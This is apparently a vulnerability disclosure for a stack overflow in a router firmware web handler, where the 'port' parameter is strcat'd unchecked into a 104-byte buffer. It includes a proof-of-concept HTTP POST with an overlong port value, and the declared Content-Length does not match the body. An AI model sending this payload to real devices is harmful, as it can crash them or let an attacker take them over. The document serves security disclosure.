# FUN_00444c8c 漏洞信息

## 基础信息
- **影响组件**: /gohead/sub_444C8C
- **固件版本**: nv518GV3v3.2.7-210919-161313

## 漏洞详情

/gohead/sub_444C8C

![alt text](image-1.png)
![alt text](image.png)

The attacker sends an HTTP request with an overly long port parameter. websGetVar() extracts this user-controlled string into Var. A fixed prefix "switch/stat_detailed.asp?port=" is copied into the 104-byte stack buffer v28. Then strcat(v28, Var) appends the attacker's string without length checking. If Var exceeds ~72 bytes, it overflows v28, overwriting the saved return address on the stack, allowing arbitrary code execution.

poc：

```
POST gohead/sub_444C8C HTTP/1.1
Host: 127.0.0.1
sec-ch-ua: "Not=A?Brand";v="24", "Chromium";v="140"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/first.asp
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

port=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
```